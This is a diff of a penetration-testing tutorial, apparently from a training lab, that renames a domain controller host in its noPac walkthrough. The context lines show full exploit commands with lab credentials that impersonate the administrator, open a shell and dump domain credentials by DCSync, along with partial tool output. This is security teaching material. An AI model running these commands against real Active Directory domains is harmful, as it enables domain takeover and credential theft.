@@ -82,7 +82,7 @@ Once Impacket is installed and we ensure the repo is cloned to our attack box, w
 #### Running NoPac
 
 ```shell
-$ sudo python3 noPac.py echoridge.local/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+$ sudo python3 noPac.py echoridge.local/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host DC01 -shell --impersonate administrator -use-ldap
 ```
 
 
@@ -103,13 +103,13 @@ We could then use the ccache file to perform a pass-the-ticket and perform furth
 
  `Using noPac to DCSync the Built-in Administrator Account`
 ```shell
-$ sudo python3 noPac.py echoridge.local/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user echoridge/administrator
+$ sudo python3 noPac.py echoridge.local/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host DC01 --impersonate administrator -use-ldap -dump -just-dc-user echoridge/administrator
 
                                                                     
 [*] Current ms-DS-MachineAccountQuota = 10
-[*] Selected Target ACADEMY-EA-DC01.echoridge.local
+[*] Selected Target DC01.echoridge.local
 [*] will try to impersonat administrator
-[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.echoridge.local
+[*] Alreay have user administrator ticket for target DC01.echoridge.local
 [*] Pls make sure your choice hostname and the -dc-ip are same machine !!
 [*] Exploiting..
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
